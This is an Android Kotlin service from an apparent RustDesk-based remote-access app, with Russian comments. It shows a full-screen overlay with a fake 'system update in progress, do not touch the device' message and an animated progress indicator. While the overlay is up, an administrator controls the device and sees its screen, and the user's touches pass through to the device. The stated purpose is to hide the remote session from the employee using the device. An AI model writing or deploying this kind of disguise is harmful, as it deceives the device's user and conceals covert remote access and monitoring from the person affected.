package com.carriez.flutter_hbb

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView

/**
 * PrivacyScreenService — занавеска поверх экрана во время удалённого сеанса.
 *
 * Показывает сотруднику сообщение "Идёт обновление системы" пока
 * администратор работает удалённо. Администратор при этом видит
 * экран устройства через RustDesk как обычно.
 *
 * Управление из Flutter:
 *   gFFI.invokeMethod("show_privacy_screen")  — показать
 *   gFFI.invokeMethod("hide_privacy_screen")  — скрыть
 *
 * Или напрямую из Kotlin:
 *   PrivacyScreenService.show(context)
 *   PrivacyScreenService.hide(context)
 */
class PrivacyScreenService : Service() {

    companion object {
        private const val TAG = "PrivacyScreen"
        const val ACTION_SHOW = "com.carriez.flutter_hbb.PRIVACY_SCREEN_SHOW"
        const val ACTION_HIDE = "com.carriez.flutter_hbb.PRIVACY_SCREEN_HIDE"

        @Volatile var isShowing = false
            private set

        fun show(context: Context) {
            val intent = Intent(context, PrivacyScreenService::class.java).apply {
                action = ACTION_SHOW
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun hide(context: Context) {
            val intent = Intent(context, PrivacyScreenService::class.java).apply {
                action = ACTION_HIDE
            }
            context.startService(intent)
        }
    }

    private var windowManager: WindowManager? = null
    private var overlayView: View? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_SHOW -> showOverlay()
            ACTION_HIDE -> {
                hideOverlay()
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        hideOverlay()
        super.onDestroy()
    }

    // -----------------------------------------------------------------------
    // Overlay
    // -----------------------------------------------------------------------

    private fun showOverlay() {
        if (overlayView != null) return  // уже показан

        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // Строим View программно — без XML
        val layout = buildOverlayView()

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
            // NOT_TOUCHABLE — касания проходят сквозь занавеску к устройству
            // (администратор может управлять)
            // NOT_FOCUSABLE — не перехватываем фокус
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
        }

        try {
            windowManager?.addView(layout, params)
            overlayView = layout
            isShowing = true
            Log.i(TAG, "Privacy screen shown")
        } catch (e: Exception) {
            Log.e(TAG, "showOverlay failed: ${e.message}")
        }
    }

    private fun hideOverlay() {
        overlayView?.let {
            try {
                windowManager?.removeView(it)
                Log.i(TAG, "Privacy screen hidden")
            } catch (e: Exception) {
                Log.e(TAG, "hideOverlay failed: ${e.message}")
            }
        }
        overlayView = null
        isShowing = false
    }

    private fun buildOverlayView(): LinearLayout {
        // Внешний контейнер — тёмный полупрозрачный фон
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.argb(240, 18, 18, 24))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        // Иконка — шестерёнка через Unicode
        val icon = TextView(this).apply {
            text = "⚙"
            textSize = 64f
            setTextColor(Color.argb(200, 80, 160, 255))
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dpToPx(24) }
        }

        // Основной текст
        val title = TextView(this).apply {
            text = "Идёт обновление системы"
            textSize = 22f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dpToPx(12) }
        }

        // Подзаголовок
        val subtitle = TextView(this).apply {
            text = "Пожалуйста, не трогайте устройство\nОбновление завершится автоматически"
            textSize = 14f
            setTextColor(Color.argb(180, 200, 200, 220))
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).also { it.bottomMargin = dpToPx(32) }
        }

        // Прогресс-точки (анимация через Handler)
        val progress = TextView(this).apply {
            text = "● ● ●"
            textSize = 18f
            setTextColor(Color.argb(150, 80, 160, 255))
            gravity = Gravity.CENTER
            tag = "progress"
        }

        root.addView(icon)
        root.addView(title)
        root.addView(subtitle)
        root.addView(progress)

        // Анимация точек
        startProgressAnimation(progress)

        return root
    }

    // Анимация ● ● ●  →  ○ ● ●  →  ● ○ ●  →  ● ● ○
    private val animHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private var animStep = 0

    private fun startProgressAnimation(view: TextView) {
        val frames = listOf("● ● ●", "○ ● ●", "● ○ ●", "● ● ○")
        val runnable = object : Runnable {
            override fun run() {
                if (overlayView == null) return
                view.text = frames[animStep % frames.size]
                animStep++
                animHandler.postDelayed(this, 500)
            }
        }
        animHandler.postDelayed(runnable, 500)
    }

    private fun dpToPx(dp: Int): Int =
        (dp * resources.displayMetrics.density).toInt()
}
